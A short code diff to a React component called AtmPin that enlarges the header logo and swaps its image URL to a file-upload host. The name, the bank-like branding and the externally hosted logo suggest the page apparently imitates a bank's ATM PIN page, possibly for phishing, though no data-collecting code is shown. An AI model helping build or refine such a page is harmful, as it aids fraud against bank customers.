@@ -45,7 +45,7 @@ export default function AtmPin() {
       <style>{`
         .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding-top: 70px; display: flex; flex-direction: column; min-height: 100vh; }
         .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
-        .logo { height: 40px; }
+        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 5px; }
         .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
         .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
         
@@ -60,7 +60,7 @@ export default function AtmPin() {
       `}</style>
       <header className="header">
         <div className="menu-icon">&#9776;</div>
-        <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
+        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663834255146/jNmGelCTuaBjjTzY.jpg" className="logo" />
         <a href="atm_pin_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
           English
         </a>
